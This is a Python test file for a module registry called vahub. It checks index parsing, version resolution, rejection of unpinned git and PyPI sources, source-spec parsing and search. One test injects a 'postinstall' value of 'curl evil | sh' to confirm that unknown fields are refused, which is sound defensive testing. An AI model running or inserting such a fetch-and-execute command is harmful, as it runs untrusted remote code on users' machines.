"""The module registry: an index of where modules come from.

Installing a module runs someone else's code on the machine, so the property
that matters most here is that a source is pinned. A registry entry or a
`--source` argument that resolves to "whatever main is today" has to be
refused, not merely discouraged.
"""

from __future__ import annotations

import json

import pytest
from pydantic import ValidationError

from vahub.contracts.registry import (
    REGISTRY_SCHEMA_VERSION,
    GitSource,
    ModuleEntry,
    PathSource,
    PypiSource,
    Registry,
    parse_source_spec,
)

INDEX = {
    "schema_version": 1,
    "updated_at": "2026-01-01T00:00:00Z",
    "modules": {
        "homeassistant": {
            "description": "Lights, locks and sensors via Home Assistant",
            "homepage": "https://example.invalid/mods",
            "tags": ["home-automation"],
            "latest": "0.2.0",
            "versions": {
                "0.1.0": {"source": {"type": "git", "url": "https://h.invalid/m", "rev": "v0.1.0"}},
                "0.2.0": {
                    "source": {
                        "type": "git",
                        "url": "https://h.invalid/m",
                        "rev": "modules/homeassistant/v0.2.0",
                        "subdir": "modules/homeassistant",
                    },
                    "requires_config": ["HA_URL", "HA_TOKEN"],
                    "optional_config": ["HA_VERIFY_SSL"],
                    "requires_vahub": "0.3.0",
                },
            },
        },
        "timer": {
            "description": "Kitchen timers",
            "tags": ["utility"],
            "versions": {"1.0.0": {"source": {"type": "pypi", "package": "vahub-mod-timer",
                "version": "1.0.0"}}},
        },
    },
}


def test_index_parses() -> None:
    reg = Registry.model_validate(INDEX)
    entry = reg.modules["homeassistant"]
    version, published = entry.resolve()
    assert version == "0.2.0"
    assert published.requires_config == ["HA_URL", "HA_TOKEN"]
    assert isinstance(published.source, GitSource)
    assert published.source.subdir == "modules/homeassistant"


def test_index_parses_from_json_text() -> None:
    reg = Registry.model_validate(json.loads(json.dumps(INDEX)))
    assert set(reg.modules) == {"homeassistant", "timer"}


def test_unknown_key_in_the_index_is_rejected() -> None:
    # A registry is fetched over the network; a field this version does not
    # understand is a reason to stop, not to guess.
    broken = json.loads(json.dumps(INDEX))
    broken["modules"]["timer"]["postinstall"] = "curl evil | sh"
    with pytest.raises(ValidationError):
        Registry.model_validate(broken)


def test_a_newer_schema_version_is_refused() -> None:
    with pytest.raises(ValidationError, match="upgrade vahub"):
        Registry.model_validate({"schema_version": REGISTRY_SCHEMA_VERSION + 1, "modules": {}})


def test_an_older_schema_version_is_accepted() -> None:
    assert Registry.model_validate({"schema_version": 1, "modules": {}}).schema_version == 1


def test_unknown_source_type_is_refused() -> None:
    with pytest.raises(ValidationError):
        Registry.model_validate(
            {"modules": {"m": {"versions": {"1.0": {"source": {"type": "http", "url": "x"}}}}}}
        )


# --------------------------------------------------------------------------
# version resolution
# --------------------------------------------------------------------------
def test_explicit_version_wins() -> None:
    entry = Registry.model_validate(INDEX).modules["homeassistant"]
    version, _ = entry.resolve("0.1.0")
    assert version == "0.1.0"


def test_unknown_version_lists_what_is_available() -> None:
    entry = Registry.model_validate(INDEX).modules["homeassistant"]
    with pytest.raises(KeyError) as excinfo:
        entry.resolve("9.9.9")
    message = str(excinfo.value)
    assert "0.1.0" in message and "0.2.0" in message


def test_latest_pointing_at_nothing_falls_back_to_the_highest_version() -> None:
    entry = ModuleEntry.model_validate(
        {
            "latest": "3.0.0",  # published later, index not yet updated
            "versions": {
                "0.9.0": {"source": {"type": "path", "path": "/a"}},
                "0.10.0": {"source": {"type": "path", "path": "/b"}},
            },
        }
    )
    version, _ = entry.resolve()
    assert version == "0.10.0"  # numeric, not lexicographic


def test_entry_without_versions_says_so() -> None:
    with pytest.raises(KeyError, match="no published versions"):
        ModuleEntry().resolve()


# --------------------------------------------------------------------------
# pinning
# --------------------------------------------------------------------------
@pytest.mark.parametrize("rev", ["main", "master", "HEAD", "refs/heads/main", "refs/heads/dev"])
def test_a_moving_branch_is_not_a_pin(rev: str) -> None:
    with pytest.raises(ValidationError, match="moving branch"):
        GitSource(url="https://h.invalid/m", rev=rev)


@pytest.mark.parametrize("rev", ["v1.2.3", "9f1a2b3c4d5e6f70819a2b3c4d5e6f7081920304", "refs/tags/v1"])
def test_a_tag_or_sha_is_a_pin(rev: str) -> None:
    assert GitSource(url="https://h.invalid/m", rev=rev).rev == rev


# --------------------------------------------------------------------------
# parse_source_spec
# --------------------------------------------------------------------------
def test_parse_git_source() -> None:
    source = parse_source_spec("git+https://host/repo.git@v1.2.3")
    assert isinstance(source, GitSource)
    assert (source.url, source.rev, source.subdir) == ("https://host/repo.git", "v1.2.3", None)


def test_parse_git_source_with_subdir() -> None:
    source = parse_source_spec("git+https://host/repo.git@v1.2.3#subdir=modules/foo")
    assert source.subdir == "modules/foo"
    assert source.rev == "v1.2.3"


def test_parse_git_source_over_ssh_keeps_the_user() -> None:
    source = parse_source_spec("git+ssh://git@host/repo.git@v1.2.3")
    assert (source.url, source.rev) == ("ssh://git@host/repo.git", "v1.2.3")


def test_parse_unpinned_git_source_is_refused() -> None:
    with pytest.raises(ValueError, match="pinned"):
        parse_source_spec("git+https://host/repo.git")


def test_parse_git_source_pinned_to_a_branch_is_refused() -> None:
    with pytest.raises(ValidationError, match="moving branch"):
        parse_source_spec("git+https://host/repo.git@main")


def test_parse_pypi_source() -> None:
    source = parse_source_spec("pypi:vahub-mod-foo==1.0.0")
    assert isinstance(source, PypiSource)
    assert (source.package, source.version) == ("vahub-mod-foo", "1.0.0")


def test_parse_unpinned_pypi_source_is_refused() -> None:
    with pytest.raises(ValueError, match="pinned"):
        parse_source_spec("pypi:vahub-mod-foo")


@pytest.mark.parametrize("spec", ["./my-module", "/opt/vahub/mod", "../sibling"])
def test_parse_path_source(spec: str) -> None:
    source = parse_source_spec(spec)
    assert isinstance(source, PathSource)
    assert source.path == spec


def test_parse_strips_surrounding_whitespace() -> None:
    assert parse_source_spec("  ./mod  ").path == "./mod"


# --------------------------------------------------------------------------
# search
# --------------------------------------------------------------------------
def test_search_matches_name_description_and_tags() -> None:
    reg = Registry.model_validate(INDEX)
    assert [n for n, _ in reg.search("timer")] == ["timer"]
    assert [n for n, _ in reg.search("locks")] == ["homeassistant"]
    assert [n for n, _ in reg.search("home-automation")] == ["homeassistant"]
    assert [n for n, _ in reg.search("HOME-AUTOMATION")] == ["homeassistant"]


def test_empty_search_lists_everything_in_order() -> None:
    assert [n for n, _ in Registry.model_validate(INDEX).search("  ")] == ["homeassistant", "timer"]


def test_search_with_no_hits_is_empty() -> None:
    assert Registry.model_validate(INDEX).search("kubernetes") == []
